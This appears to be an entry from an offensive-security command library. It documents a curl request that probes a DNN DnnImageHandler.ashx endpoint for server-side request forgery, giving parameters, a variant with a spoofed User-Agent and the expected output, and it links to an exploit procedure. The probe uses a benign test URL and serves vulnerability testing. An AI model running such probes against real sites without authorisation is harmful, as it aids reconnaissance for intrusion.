---
id: cmd-uuid-001
data: >-
  curl -v
  "https://target-site.com/DnnImageHandler.ashx?mode=file&url=http://example.com/test.jpg"
tags:
  - ssrf
  - web
  - recon
type: command
output: |-
  HTTP/1.1 200 OK
  <image binary data>
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:02.295Z'
verified: false
validated: true
submitted: true
---
# curl-dnn-access

## Command

```bash
curl -v "https://target-site.com/DnnImageHandler.ashx?mode=file&url=http://example.com/test.jpg"
```

## Description

This command accesses the DNN ImageHandler endpoint with a benign external URL to verify SSRF vulnerability presence, checking if the server fetches and returns the image without validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output showing headers and requests | Yes |
| `https://target-site.com/DnnImageHandler.ashx` | Target endpoint URL | Yes |
| `?mode=file&url=` | Parameters to trigger file mode and supply URL | Yes |
| `http://example.com/test.jpg` | Benign test image URL | Yes |

## Examples

### Basic Usage

```bash
curl -v "https://target-site.com/DnnImageHandler.ashx?mode=file&url=http://example.com/test.jpg"
```

### Advanced Usage

```bash
curl -v -H "User-Agent: Mozilla/5.0" "https://target-site.com/DnnImageHandler.ashx?mode=file&url=http://example.com/test.jpg" -o output.jpg
```

## Expected Output

Verbose logs show the request, followed by HTTP 200 OK and the binary image data if successful, or errors if patched/blocked.

## Related

- [[Related Procedure|procedures/Exploit-DNN-ImageHandler-SSRF]]
